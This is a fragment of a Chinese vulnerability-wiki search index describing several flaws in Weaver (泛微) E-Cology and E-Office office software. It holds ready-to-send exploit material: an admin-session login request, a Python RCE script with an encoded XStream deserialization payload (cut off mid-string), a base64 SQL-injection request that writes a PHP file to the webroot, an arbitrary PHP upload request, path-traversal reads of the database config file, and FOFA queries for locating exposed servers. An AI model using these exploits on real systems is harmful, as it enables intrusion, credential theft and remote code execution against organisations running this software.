","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Cology ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品主页 验证POC POST /mobile/plugin/VerifyQuickLogin.jsp identifier=1\u0026language=1\u0026ipaddress=x.x.x.x ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-verifyquicklogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-cology WorkflowServiceXml RCE ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/"},{"categories":null,"content":"漏洞描述 泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/"},{"categories":null,"content":"漏洞影响 E-cology \u003c= 9.0 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/"},{"categories":null,"content":"漏洞复现 漏洞原理来源 https://www.anquanke.com/post/id/239865 根据流量可以得知路由为/services%20/WorkflowServiceXml，我随即查看了该OA的web.xml。 发现了相关类为weaver.workflow.webservices.WorkflowServiceXml、weaver.workflow.webservices.WorkflowServiceImplXml。 关于类的东西先放到一旁，毕竟路由是否真实存在、%20有什么意义才是重点。我开始验证路由的存在。这里我测试了两个版本。 带上%20试试 根据这个response可以看出这应该是一个soap xml注入，具体是XMLDecoder、XStream或者其他什么，还得看weaver.workflow.webservices.WorkflowServiceXml、weaver.workflow.webservices.WorkflowServiceImplXml. 首先，先看看weaver.workflow.webservices.WorkflowServiceXml 可以注意到这是一个接口类，其中一个方法doCreateWorkflowRequest比较可疑。 去weaver.workflow.webservices.WorkflowServiceImplXml看看这个方法的实现。 继续跟踪看看 这个xs咋看起来这么眼熟？看看xs是个啥，一般Java可能会定义在代码文件最上方。 原来xs是XStream的对象 既然决定了sink点，下一步肯定是POC的撰写了，先确定SOAP基本模板。 根据朋友给的流量可以确定基本SOAP消息体模板大致是这样的。 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.services.weaver.com.cn\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cweb:doCreateWorkflowRequest\u003e \u003cweb:string\u003e\u003c/web:string\u003e \u003cweb:string\u003e2\u003c/web:string\u003e \u003c/web:doCreateWorkflowRequest\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e 验证成功。 接下来就是寻找gadget了。 由于并没有完整源码，只有部分github源码，不能确定gadget，先使用URLDNS试试。 \u003cmap\u003e \u003centry\u003e \u003curl\u003ehttp://1xsz12.dnslog.cn\u003c/url\u003e \u003cstring\u003ehttp://1xsz12.dnslog.cn\u003c/string\u003e \u003c/entry\u003e \u003c/map\u003e 组合我们的模板试试。 这里涉及到实体编码问题，作为懒人直接选择整体编码算了。 随后dnslog成功收到请求。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 泛微E-Cology WorkflowServiceXml RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/services%20/WorkflowServiceXml\" cmd = \"net user\" headers = { 'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)', 'SOAPAction': '\"\"', 'Cmd': cmd, \"Content-Type\": \"text/xml;charset=UTF-8\" } data = '''\u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.services.weaver.com.cn\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cweb:doCreateWorkflowRequest\u003e \u003cweb:string\u003e \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.services.weaver.com.cn\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cweb:doCreateWorkflowRequest\u003e \u003cweb:string\u003e \u0026#x3c;\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x2e;\u0026#x75;\u0026#x74;\u0026#x69;\u0026#x6c;\u0026#x2e;\u0026#x50;\u0026#x72;\u0026#x69;\u0026#x6f;\u0026#x72;\u0026#x69;\u0026#x74;\u0026#x79;\u0026#x51;\u0026#x75;\u0026#x65;\u0026#x75;\u0026#x65;\u0026#x20;\u0026#x73;\u0026#x65;\u0026#x72;\u0026#x69;\u0026#x61;\u0026#x6c;\u0026#x69;\u0026#x7a;\u0026#x61;\u0026#x74;\u0026#x69;\u0026#x6f;\u0026#x6e;\u0026#x3d;\u0026#x27;\u0026#x63;\u0026#x75;\u0026#x73;\u0026#x74;\u0026#x6f;\u0026#x6d;\u0026#x27;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x75;\u0026#x6e;\u0026#x73;\u0026#x65;\u0026#x72;\u0026#x69;\u0026#x61;\u0026#x6c;\u0026#x69;\u0026#x7a;\u0026#x61;\u0026#x62;\u0026#x6c;\u0026#x65;\u0026#x2d;\u0026#x70;\u0026#x61;\u0026#x72;\u0026#x65;\u0026#x6e;\u0026#x74;\u0026#x73;\u0026#x2f;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x2e;\u0026#x75;\u0026#x74;\u0026#x69;\u0026#x6c;\u0026#x2e;\u0026#x50;\u0026#x72;\u0026#x69;\u0026#x6f;\u0026#x72;\u0026#x69;\u0026#x74;\u0026#x79;\u0026#x51;\u0026#x75;\u0026#x65;\u0026#x75;\u0026#x65;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x64;\u0026#x65;\u0026#x66;\u0026#x61;\u0026#x75;\u0026#x6c;\u0026#x74;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x73;\u0026#x69;\u0026#x7a;\u0026#x65;\u0026#x3e;\u0026#x32;\u0026#x3c;\u0026#x2f;\u0026#x73;\u0026#x69;\u0026#x7a;\u0026#x65;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x63;\u0026#x6f;\u0026#x6d;\u0026#x70;\u0026#x61;\u0026#x72;\u0026#x61;\u0026#x74;\u0026#x6f;\u0026#x72;\u0026#x20;\u0026#x63;\u0026#x6c;\u0026#x61;\u0026#x73;\u0026#x73;\u0026#x3d;\u0026#x27;\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x66;\u0026#x78;\u0026#x2e;\u0026#x63;\u0026#x6f;\u0026#x6c;\u0026#x6c;\u0026#x65;\u0026#x63;\u0026#x74;\u0026#x69;\u0026#x6f;\u0026#x6e;\u0026#x73;\u0026#x2e;\u0026#x4f;\u0026#x62;\u0026#x73;\u0026#x65;\u0026#x72;\u0026#x76;\u0026#x61;\u0026#x62;\u0026#x6c;\u0026#x65;\u0026#x4c;\u0026#x69;\u0026#x73;\u0026#x74;\u0026#x24;\u0026#x31;\u0026#x27;\u0026#x2f;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x2f;\u0026#x64;\u0026#x65;\u0026#x66;\u0026#x61;\u0026#x75;\u0026#x6c;\u0026#x74;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x69;\u0026#x6e;\u0026#x74;\u0026#x3e;\u0026#x33;\u0026#x3c;\u0026#x2f;\u0026#x69;\u0026#x6e;\u0026#x74;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x63;\u0026#x6f;\u0026#x6d;\u0026#x2e;\u0026#x73;\u0026#x75;\u0026#x6e;\u0026#x2e;\u0026#x78;\u0026#x6d;\u0026#x6c;\u0026#x2e;\u0026#x69;\u0026#x6e;\u0026#x74;\u0026#x65;\u0026#x72;\u0026#x6e;\u0026#x61;\u0026#x6c;\u0026#x2e;\u0026#x62;\u0026#x69;\u0026#x6e;\u0026#x64;\u0026#x2e;\u0026#x76;\u0026#x32;\u0026#x2e;\u0026#x72;\u0026#x75;\u0026#x6e;\u0026#x74;\u0026#x69;\u0026#x6d;\u0026#x65;\u0026#x2e;\u0026#x75;\u0026#x6e;\u0026#x6d;\u0026#x61;\u0026#x72;\u0026#x73;\u0026#x68;\u0026#x61;\u0026#x6c;\u0026#x6c;\u0026#x65;\u0026#x72;\u0026#x2e;\u0026#x42;\u0026#x61;\u0026#x73;\u0026#x65;\u0026#x36;\u0026#x34;\u0026#x44;\u0026#x61;\u0026#x74;\u0026#x61;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x64;\u0026#x61;\u0026#x74;\u0026#x61;\u0026#x48;\u0026#x61;\u0026#x6e;\u0026#x64;\u0026#x6c;\u0026#x65;\u0026#x72;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x64;\u0026#x61;\u0026#x74;\u0026#x61;\u0026#x53;\u0026#x6f;\u0026#x75;\u0026#x72;\u0026#x63;\u0026#x65;\u0026#x20;\u0026#x63;\u0026#x6c;\u0026#x61;\u0026#x73;\u0026#x73;\u0026#x3d;\u0026#x27;\u0026#x63;\u0026#x6f;\u0026#x6d;\u0026#x2e;\u0026#x73;\u0026#x75;\u0026#x6e;\u0026#x2e;\u0026#x78;\u0026#x6d;\u0026#x6c;\u0026#x2e;\u0026#x69;\u0026#x6e;\u0026#x74;\u0026#x65;\u0026#x72;\u0026#x6e;\u0026#x61;\u0026#x6c;\u0026#x2e;\u0026#x77;\u0026#x73;\u0026#x2e;\u0026#x65;\u0026#x6e;\u0026#x63;\u0026#x6f;\u0026#x64;\u0026#x69;\u0026#x6e;\u0026#x67;\u0026#x2e;\u0026#x78;\u0026#x6d;\u0026#x6c;\u0026#x2e;\u0026#x58;\u0026#x4d;\u0026#x4c;\u0026#x4d;\u0026#x65;\u0026#x73;\u0026#x73;\u0026#x61;\u0026#x67;\u0026#x65;\u0026#x24;\u0026#x58;\u0026#x6d;\u0026#x6c;\u0026#x44;\u0026#x61;\u0026#x74;\u0026#x61;\u0026#x53;\u0026#x6f;\u0026#x75;\u0026#x72;\u0026#x63;\u0026#x65;\u0026#x27;\u0026#x3e;\u0026#x0a;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x20;\u0026#x3c;\u0026#x63;\u0026#x6f;\u0026#x6e;\u0026#x74;\u0026#x65;\u0026#x6e;\u0026#x74;\u0026#x54;\u0026#x79;\u0026#x70;\u0026#x65;\u0026#x3e;\u0026#x74;\u0026#x65;\u0026#x78;\u0026#x74;\u0026#x2f","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/:5:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-workflowservicexml-rce/"},{"categories":null,"content":"泛微OA E-Office group_xml.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Office group_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Office 8 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-EOffice\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件为 inc/group_user_list/group_xml.php session_start( ); include_once( \"inc/conn.php\" ); include_once( \"inc/xtree_xml.inc.php\" ); include_once( \"inc/utility_all.php\" ); header( \"Expires: Mon, 26 Jul 1997 05:00:00 GMT\" ); header( \"Cache-Control: no-cache, must-revalidate\" ); header( \"Pragma: no-cache\" ); header( \"Content-Type: text/xml\" ); $pararr = explodestpar( $_REQUEST['par'] ); $groupid = $pararr['groupid']; if ( $groupid == \"\" ) { exit( ); } $groupurl_fix = \"?\"; $userurl_fix = \"?\"; if ( 0 \u003c strpos( $pararr['group_url'], \"?\" ) ) { $groupurl_fix = \"\u0026\"; } if ( 0 \u003c strpos( $pararr['user_url'], \"?\" ) ) { $userurl_fix = \"\u0026\"; } $xtreeXml = new xtreeXml( ); $xtreeXml-\u003einitXml( ); if ( $pararr['group'] == 1 ) { $sql = \"SELECT * FROM pub_group WHERE GROUP_ID=\".$groupid.\"\"; } else { $sql = \"SELECT * FROM USER,USER_GROUP WHERE USER_GROUP.GROUP_ID=\".$groupid.\"\"; } $rs = exequery( $connection, $sql ); $row = mysql_fetch_array( $rs ); $groupmember = $row['GROUP_MEMBER']; $groupid没有被双引号包裹，然后造成注入。然后$groupid来自于$pararr[‘groupid’];其中经过了$explodestpar这个函数 function explodeStPar( $enpar ) { $depar = base64_decode( $enpar ); $arrpar = explode( \"|\", $depar ); if ( !is_array( $arrpar ) ) { return false; } $i = 0; for ( ; $i \u003c sizeof( $arrpar ); ++$i ) { $strpar = $arrpar[$i]; $tmparr = explode( \":\", $strpar ); $j = 0; for ( ; $j \u003c sizeof( $tmparr ); ++$j ) { if ( $j == 0 ) { preg_match( \"/\\\\[([a-z0-9-_].+)\\\\]/i\", $tmparr[$j], $exp ); $par = $exp[1]; } else { preg_match( \"/\\\\[(.*)\\\\]/i\", $tmparr[$j], $exp ); $val = $exp[1]; } } if ( trim( $par ) != \"\" ) { $rearr[$par] = $val; } } return $rearr; } 构造EXP写入文件 [group]:[1]|[groupid]:[1 union select '\u003c?php phpinfo()?\u003e',2,3,4,5,6,7,8 into outfile '../webroot/vulntest.php'] | | base64 | /inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-group_xml.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微 E-Office ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-EOffice\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /mysql_config.ini ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Office OfficeServer.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Office ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"eoffice10\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1 Host: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cache-Control: max-age=0 Connection: close Content-Length: 990 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew Origin: null Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 ------WebKitFormBoundaryLpoiBFy4ANA8daew Content-Disposition: form-data;name=\"FileData\";filename=\"test.php\" Content-Type: application/octet-stream \u003c?php phpinfo(); ?\u003e ------WebKitFormBoundaryLpoiBFy4ANA8daew Content-Disposition: form-data;name=\"FormData\" {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'} ------WebKitFormBoundaryLpoiBFy4ANA8daew-- 文件上传位置 /eoffice10/server/public/iWebOffice2015/Document/test.php ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Office officeserver.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Office officeserver.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Office ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"FOF app=\"泛微-EOffice\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /iweboffice/officeserver.php?OPTION=LOADFILE\u0026FILENAME=../mysql_config.ini 